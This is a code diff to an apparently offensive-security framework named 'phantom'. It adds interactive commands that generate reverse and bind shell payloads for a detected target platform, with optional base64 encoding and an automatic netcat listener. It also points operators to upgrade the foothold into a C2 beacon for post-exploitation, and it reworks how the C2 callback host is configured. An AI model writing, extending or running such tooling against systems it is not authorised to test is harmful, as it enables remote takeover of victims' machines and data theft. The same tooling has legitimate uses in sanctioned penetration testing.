@@ -100,7 +100,8 @@ class PayloadModule(BaseModule):
     def build_commands(self) -> dict:
         return self._with_suggestions(
             {
-                "CORE": ["generate", "deploy", "privesc"],
+                "CORE": ["generate", "reverse [lhost] [lport]",
+                          "bind [port]", "deploy", "privesc"],
                 "LISTENER": ["handler <port> <payload>"],
             },
             self.suggest_commands(),
@@ -110,6 +111,84 @@ class PayloadModule(BaseModule):
         """Platform-aware payload generation for the detected target OS."""
         from phantom.modules.suggest import payload_suggestion_group
         return payload_suggestion_group()
+
+    def do_reverse(self, arg):
+        """reverse [lhost] [lport] — synthesize a multi-dialect reverse
+        shell with the enterprise payload engine (the same one the
+        auto-mode ships): best dialect for the target platform, optional
+        base64 encoder, automatic listener, and the beacon upgrade path."""
+        from phantom.automation.brain.payload import get_payload_engine
+        os_string, arch, platform = self._guess_os()
+        parts = (arg or "").split()
+        lhost = parts[0] if parts else self._get_lhost()
+        try:
+            lport = int(parts[1]) if len(parts) > 1 else \
+                    int(session.lport or 4444)
+        except (TypeError, ValueError):
+            lport = 4444
+        engine = get_payload_engine()
+        options = engine.reverse_options(platform)
+        console.print(f"\n[bold]-- REVERSE SHELL ({platform} · {os_string}) --[/]\n")
+        console.print(f"  LHOST: [yellow]{lhost}[/]   LPORT: [yellow]{lport}[/]\n")
+        console.print("  Dialects (best-first for this platform):")
+        for i, d in enumerate(options, 1):
+            marker = " [dim](best)[/]" if i == 1 else ""
+            console.print(f"    [{i}] {d}{marker}")
+        pick = input(f"  Dialect [1-{len(options)}] [1]: ").strip() or "1"
+        try:
+            dialect = options[int(pick) - 1]
+        except (ValueError, IndexError):
+            notifier.error("Invalid dialect.")
+            return
+        enc = input("  Encoder [plain|base64] [plain]: ").strip() or "plain"
+        if enc not in engine.ENCODERS:
+            notifier.error("Invalid encoder.")
+            return
+        payload = engine.reverse(platform, lhost, lport,
+                                 dialect=dialect, encoder=enc)
+        console.print(f"\n  [bold green][+] {payload.note}[/]")
+        console.print(f"      [yellow]{payload.command}[/]\n")
+        # optional automatic listener
+        act = input("  Start listener now? [y/N]: ").strip().lower()
+        if act.startswith("y"):
+            from phantom.modules.handler import HandlerModule
+            HandlerModule().do_nc(str(lport))
+        console.print("  [dim]Next:\t'use payload' → deploy  (or 'use exploit' →"
+                      " deploy-agent) upgrades this foothold to the C2\n"
+                      "  beacon — full post-exploitation over the encrypted"
+                      " channel.[/]")
+        session.add_note(f"Reverse shell ({dialect}/{enc}) {lhost}:{lport}")
+
+    def do_bind(self, arg):
+        """bind [port] — synthesize a BIND shell (target listens).
+        LOUD BY NATURE: only use when outbound egress is blocked."""
+        from phantom.automation.brain.payload import get_payload_engine
+        os_string, arch, platform = self._guess_os()
+        try:
+            port = int((arg or "").split()[0]) if (arg or "").split() else 4444
+        except ValueError:
+            notifier.error("Usage: bind <port>")
+            return
+        engine = get_payload_engine()
+        options = engine.bind_options(platform)
+        console.print(f"\n[bold]-- BIND SHELL ({platform}) --[/]")
+        console.print(f"  Target listens on port [yellow]{port}[/].\n")
+        console.print("  Dialects:")
+        for i, d in enumerate(options, 1):
+            marker = " [dim](best)[/]" if i == 1 else ""
+            console.print(f"    [{i}] {d}{marker}")
+        pick = input(f"  Dialect [1-{len(options)}] [1]: ").strip() or "1"
+        try:
+            dialect = options[int(pick) - 1]
+        except (ValueError, IndexError):
+            notifier.error("Invalid dialect.")
+            return
+        payload = engine.bind(platform, port, dialect=dialect)
+        console.print(f"\n  [bold green][+] {payload.note}[/]")
+        console.print(f"      [yellow]{payload.command}[/]\n")
+        notifier.warn("Bind shells are LOUD — prefer reverse unless egress "
+                      "is blocked.")
+        session.add_note(f"Bind shell ({dialect}) port {port}")
 
     def do_privesc(self, _):
         """privesc — run ACTIVE privilege-escalation enumeration on the
@@ -226,8 +305,12 @@ class PayloadModule(BaseModule):
         the detected target platform (the same binary the auto-mode ships),
         then print the one-liner to execute on the target."""
         os_string, arch, platform = self._guess_os()
-        c2_host = os.getenv("PHANTOM_C2_HOST", "127.0.0.1")
-        c2_port = int(os.getenv("PHANTOM_C2_PORT", "8080"))
+        from phantom.utils import config as cfg
+        c2_host = str(cfg.get("c2.host", "127.0.0.1", env="PHANTOM_C2_HOST"))
+        try:
+            c2_port = int(cfg.get("c2.port", "8080", env="PHANTOM_C2_PORT"))
+        except (TypeError, ValueError):
+            c2_port = 8080
         notifier.info(f"Target platform: {platform} ({arch}) — {os_string}")
         notifier.info(f"C2 callback: {c2_host}:{c2_port}")
         try:
